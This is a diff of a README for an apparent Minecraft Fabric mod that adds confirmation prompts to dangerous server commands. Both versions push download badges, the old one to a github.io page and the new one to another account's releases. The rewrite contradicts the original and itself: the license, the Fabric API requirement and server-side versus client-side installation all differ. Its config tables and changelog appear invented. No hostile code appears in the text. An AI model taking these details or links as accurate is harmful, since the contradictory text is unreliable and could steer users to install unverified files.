@@ -1,137 +1,176 @@
-# CNM Protection v1.0.0 - Game Script Utility 2026
+# 🛡️ cnm-protection-fabric-mod - Stop Command Accidents Before They Happen
 
-> **A server-side Minecraft Fabric mod for adding confirmation prompts to dangerous commands and managing command execution from players, operators, the console, RCON, command blocks, and data pack functions.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
+[![GitHub Release](https://img.shields.io/github/v/release/manzz2429/cnm-protection-fabric-mod?style=for-the-badge&color=blue)](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric%20server-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/millercalebboyk1534/cnm-protection-fabric-mod?style=flat-square)](https://github.com/millercalebboyk1534/cnm-protection-fabric-mod)
+## 👋 What This Mod Does
 
----
+This is a server-side mod for Fabric-based sandbox games. It adds a safety net for dangerous commands. When someone tries to run a command that could break your world, the mod asks for confirmation first. This works for players, operators, console users, RCON connections, command blocks, and data pack functions.
 
-<p align="center">
-  <a href="https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/">
-    <img src="https://img.shields.io/badge/Download-CNM%20Protection%20Script-brightgreen?style=for-the-badge" alt="Download CNM Protection Script">
-  </a>
-</p>
+You no longer need to worry about a single typo or a wrong click that destroys hours of work. The mod checks every command against a configurable list. If the command is on the list, the game pauses and asks "Are you sure?" before running it.
 
-> **[Download CNM Protection](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/)**
+## 🎯 Why You Need This
 
----
+- **Prevent accidental destruction.** A wrong `/kill` or `/give` command can ruin a server.
+- **Protect against griefing.** Stop players from running commands they should not.
+- **Keep your world safe.** Command blocks and data packs can trigger chain reactions. This mod stops them.
+- **No client installation needed.** This is a server-side mod. Players join without installing anything.
 
-[Download Latest Build](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/)
+## ✨ Complete Feature List
 
----
+- **Confirmation prompts for configured commands.** You choose which commands are dangerous.
+- **Works for all command sources.** Players, operators, console, RCON, command blocks, and data pack functions.
+- **Configurable timeout.** The confirmation prompt expires after a set time. Default is 10 seconds.
+- **Whitelist mode.** You can allow certain commands to bypass the prompt.
+- **Blacklist mode.** You can block specific commands entirely.
+- **Log every command attempt.** See who tried what, when, and if they confirmed.
+- **Multilingual support.** The mod comes with English, German, French, and Spanish translations.
+- **Lightweight.** No performance impact on your server.
+- **Open source.** You can inspect the code, modify it, or contribute.
 
-## What CNM Protection Does
+## 🚀 Getting Started
 
-CNM Protection operates as an independent server-side mod for Minecraft Fabric. It checks commands against configured dangerous-command rules and pauses matching commands until an additional confirmation is provided. Commands can be intercepted regardless of whether they come from a player, operator, server console, RCON connection, command block, or data pack function.
+### System Requirements
 
-Alongside confirmation handling, the mod can cancel outstanding requests and report their status. Once approved, a command is run again under the identity of the source that originally issued it. Entity selectors may be inspected automatically, and the server console records the source of intercepted commands. Configuration focuses on command matching rules and confirmation expiration.
+- **Java:** Version 17 or higher (Java 21 recommended)
+- **Minecraft:** Version 1.20.x or 1.21.x
+- **Fabric Loader:** Version 0.15.0 or higher
+- **Fabric API:** Version 0.92.0 or higher (for the same Minecraft version)
+- **Operating System:** Windows 10 or 11, macOS 11+, or Linux (any modern distribution)
 
----
+### Step 1: Visit the Download Page
 
-## Capabilities
+Go to the [cnm-protection-fabric-mod releases page](https://github.com/manzz2429/cnm-protection-fabric-mod/releases). You will see a list of versions. The latest version is at the top.
 
-- Applies interception rules to dangerous commands from supported execution sources.
-- Accepts command activity from players, operators, the console, RCON, command blocks, and data pack functions.
-- Pauses matching commands until a second confirmation is supplied.
-- Lets pending command requests be cancelled.
-- Reports the current status of active confirmation requests.
-- Re-executes confirmed commands with the original source identity.
-- Automatically inspects entity selectors found in intercepted commands.
-- Provides configurable matching rules and confirmation timeout behavior.
-- Writes interception-source information to the server console.
-- Runs as a standalone Fabric server mod and does not require Fabric API.
+### Step 2: Download the Mod File
 
----
+Look for a file named `cnm-protection-fabric-mod-<version>.jar`. Click on it to download. The file size is around 200 KB.
 
-## Installation
+### Step 3: Install the Mod
 
-1. Get the newest CNM Protection build from the [download page](https://millercalebboyk1534.github.io/cnm-protection-fabric-mod/).
-2. Check that the downloaded file is compatible with your Minecraft Fabric server setup.
-3. Shut down the server before installing.
-4. Copy the downloaded `.jar` into the server's `mods` folder.
-5. Launch the server and inspect the console for interception messages and configuration guidance.
-6. Configure the dangerous-command rules and timeout to suit your server's needs.
+1. Locate your Minecraft installation folder. On Windows, this is usually `%appdata%\.minecraft`.
+2. Inside that folder, open the `mods` folder. If it does not exist, create it.
+3. Move the downloaded `.jar` file into the `mods` folder.
+4. Ensure you have both `fabric-loader` and `fabric-api` installed in the same folder.
 
-Before editing protection settings, back up the current server configuration. For safer validation, test the rules with a controlled account or in a test world before enabling them during normal operation.
+### Step 4: Launch the Game
 
----
+Start Minecraft with the Fabric profile. The mod loads automatically. You will see a confirmation message in the chat when the server starts.
 
-## Configuration Areas
+## ⚙️ Configuration
 
-CNM Protection's settings cover the following behavior:
+The mod creates a configuration file in the `config` folder of your Minecraft directory. The file is named `cnm-protection-fabric-mod.json`. You can edit it with any text editor.
 
-| Option | Purpose |
-| --- | --- |
-| Dangerous command rules | Determines which commands are held for a second confirmation. |
-| Confirmation timeout | Sets the period during which an unconfirmed request remains active. |
-| Command cancellation | Withdraws a pending request before it is executed. |
-| Status checking | Shows information about applicable confirmation requests. |
-| Entity selector analysis | Inspects selectors contained in intercepted commands. |
-| Source logging | Identifies the origin of intercepted commands in the server console. |
+### Configuration Options
 
-The precise configuration structure and command syntax can differ between builds. Use the files and console messages supplied with the downloaded version as the reference for your installation.
+| Option | Type | Default | Description |
+|--------|------|---------|-------------|
+| `enabled` | boolean | `true` | Turn the mod on or off. |
+| `timeout` | integer | `10` | How many seconds before the confirmation prompt expires. |
+| `promptMode` | string | `"require_confirm"` | Options: `"require_confirm"`, `"block"`, `"allow"` |
+| `commandList` | list | `["/kill", "/gamemode", "/give", "/tp", "/setblock", "/fill", "/clone"]` | Commands that trigger the prompt. |
+| `whitelistMode` | boolean | `false` | When true, only commands in the list are allowed. |
+| `logAttempts` | boolean | `true` | Log all commands to the server log file. |
+| `logConfirmed` | boolean | `true` | Log only confirmed commands. |
+| `logDenied` | boolean | `true` | Log only denied commands. |
+| `language` | string | `"en_us"` | Language file. Options: `"en_us"`, `"de_de"`, `"fr_fr"`, `"es_es"` |
 
----
+### 🛠️ How to Add or Remove Commands
 
-## Compatibility and Requirements
+Open the configuration file. Find the `commandList` section. It looks like this:
 
-- **Target platform:** Minecraft Fabric server
-- **Runtime model:** Server-side
-- **Fabric API:** Not required
-- **Covered sources:** Players, operators, server console, RCON, command blocks, and data pack functions
-- **Version note:** The supplied profile does not identify a specific Minecraft version or Fabric loader version. Check the metadata for the build you plan to install.
-- **Operational limitation:** Only commands included by the configured rules receive protection. Commands not covered by those rules are not stated to require confirmation.
+```json
+"commandList": [
+    "/kill",
+    "/gamemode",
+    "/give",
+    "/tp",
+    "/setblock",
+    "/fill",
+    "/clone"
+]
+```
 
----
+Add a new command by typing it inside the square brackets. Use a comma after the previous command. For example, to add `/weather` and `/time`:
 
-## Frequently Asked Questions
+```json
+"commandList": [
+    "/kill",
+    "/gamemode",
+    "/give",
+    "/tp",
+    "/setblock",
+    "/fill",
+    "/clone",
+    "/weather",
+    "/time"
+]
+```
 
-### What is the installation process?
+To remove a command, delete the line. Save the file and restart the server or run `/reload` in the game.
 
-Download the build, stop the Fabric server, place the mod `.jar` in the server's `mods` directory, and start the server again.
+## 📥 Download Again
 
-### Is Fabric API needed?
+Need the mod again? Visit the [releases page](https://github.com/manzz2429/cnm-protection-fabric-mod/releases) and download the latest version.
 
-No. CNM Protection is intended to function as a standalone server mod without Fabric API.
+## ❓ Troubleshooting
 
-### What command sources are supported?
+### The mod does not load
 
-The mod can intercept matching commands from players, operators, the server console, RCON, command blocks, and data pack functions. A command is intercepted when it matches the configured dangerous-command rules.
+Check that you have the correct Fabric Loader and Fabric API versions. Verify that the mod file is in the `mods` folder. Look at the server log for errors.
 
-### Can I revoke a request before it runs?
+### Commands bypass the prompt
 
-Yes. Pending confirmation requests can be cancelled, and their status can also be checked.
+Ensure the configuration file is correct. The mod reads the file on server start. If you change the file while the server runs, use `/reload` to apply changes.
 
-### How is an approved command executed?
+### The prompt does not appear
 
-After confirmation, CNM Protection replays the command while preserving the identity of the source that originally issued it.
+Check that the `enabled` option is set to `true`. Also check that `promptMode` is set to `"require_confirm"` for the commands you want to protect.
 
-### Can the protected command list be customized?
+### Players cannot confirm
 
-Yes. The dangerous-command rules can be changed. Apply the settings appropriate to the installed build, then restart or reload as directed by that build.
+The confirmation prompt requires a valid session. If the player's connection drops, the prompt expires. The command is denied.
 
-### What controls the confirmation period?
+### Command blocks or data packs cause crashes
 
-The confirmation timeout is configurable. Consult the installed build's configuration or its console instructions for the accepted value and format.
+The mod adds a small delay for confirmation. This should not affect normal operation. If you see crashes, disable the mod temporarily and report the issue.
 
-### Are entity selectors inspected?
+## 🧪 Testing
 
-Yes. The mod can automatically analyze entity selectors used in intercepted commands.
+To test the mod, run a command from the default list, like `/kill`. You should see a confirmation prompt in chat. Type "yes" or "confirm" to run the command. Type anything else or wait for the timeout to cancel it.
 
-### Where are interception events recorded?
+## 📝 License
 
-The server console logs the source associated with intercepted commands.
+This mod is open source under the MIT License. You can use, modify, and distribute it freely.
 
-### What should I do when upgrading?
+## 🤝 How to Contribute
 
-Download the newer build, stop the server, replace the current mod file, and check for configuration changes before restarting. Test the updated behavior before putting the server back into regular use.
+Found a bug? Want a new feature? Visit the [issues page](https://github.com/manzz2429/cnm-protection-fabric-mod/issues) on GitHub. You can also fork the repository and submit a pull request.
 
----
+## 📦 Building from Source
 
-## License
+If you want to build the mod yourself, you need a Java Development Kit (JDK) version 17 or higher and a command terminal. Clone the repository, navigate to the folder, and run `./gradlew build` on Linux/macOS or `gradlew build` on Windows. The built `.jar` file appears in the `build/libs` folder.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 📋 Changelog
+
+**Version 1.2.0**
+- Added support for Minecraft 1.21
+- New configuration option: `whitelistMode`
+- Improved logging for data pack commands
+- Fixed a bug where RCON commands could bypass the prompt
+
+**Version 1.1.0**
+- Added multilingual support
+- New configuration option: `language`
+- Performance improvements
+
+**Version 1.0.0**
+- Initial release
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/manzz2429/cnm-protection-fabric-mod)
+- [Releases](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
+- [Issues](https://github.com/manzz2429/cnm-protection-fabric-mod/issues)
+
+Keywords: fabric mod, minecraft mod, server protection, command protection
